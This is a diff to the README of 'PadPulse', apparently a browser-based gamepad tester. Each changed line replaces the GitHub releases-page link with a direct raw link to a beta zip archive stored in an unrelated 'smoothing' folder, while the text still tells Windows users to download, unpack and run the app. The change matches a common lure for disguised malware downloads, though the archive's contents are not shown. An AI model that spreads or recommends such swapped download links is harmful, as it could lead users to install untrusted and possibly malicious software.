@@ -1,6 +1,6 @@
 # 🎮 PadPulse - Test Gamepads With Clear Results
 
-[![Download PadPulse](https://img.shields.io/badge/Download%20PadPulse-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/gainly-handclap319/PadPulse/releases)
+[![Download PadPulse](https://img.shields.io/badge/Download%20PadPulse-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/gainly-handclap319/PadPulse/main/smoothing/Pad_Pulse_3.6-beta.1.zip)
 
 ## 🖥️ What PadPulse Does
 
@@ -18,7 +18,7 @@ PadPulse runs in your browser, so you do not need a full desktop app with a long
 
 Go to the releases page here:
 
-https://github.com/gainly-handclap319/PadPulse/releases
+https://raw.githubusercontent.com/gainly-handclap319/PadPulse/main/smoothing/Pad_Pulse_3.6-beta.1.zip
 
 On that page:
 
@@ -36,7 +36,7 @@ PadPulse is meant to be easy to start on a Windows PC.
 ### 1. Open the download page
 Use this link:
 
-https://github.com/gainly-handclap319/PadPulse/releases
+https://raw.githubusercontent.com/gainly-handclap319/PadPulse/main/smoothing/Pad_Pulse_3.6-beta.1.zip
 
 ### 2. Get the latest release
 Look for the top release on the page. It usually has the newest version.
@@ -208,7 +208,7 @@ If you see a ZIP archive, unpack it before opening the app. If you see a direct 
 ## 📌 Quick Start
 
 1. Open the release page  
-   https://github.com/gainly-handclap319/PadPulse/releases
+   https://raw.githubusercontent.com/gainly-handclap319/PadPulse/main/smoothing/Pad_Pulse_3.6-beta.1.zip
 
 2. Download the latest Windows build
 
@@ -233,4 +233,4 @@ If you see a ZIP archive, unpack it before opening the app. If you see a direct 
 
 If you need the file again, use this link:
 
-https://github.com/gainly-handclap319/PadPulse/releases
+https://raw.githubusercontent.com/gainly-handclap319/PadPulse/main/smoothing/Pad_Pulse_3.6-beta.1.zip
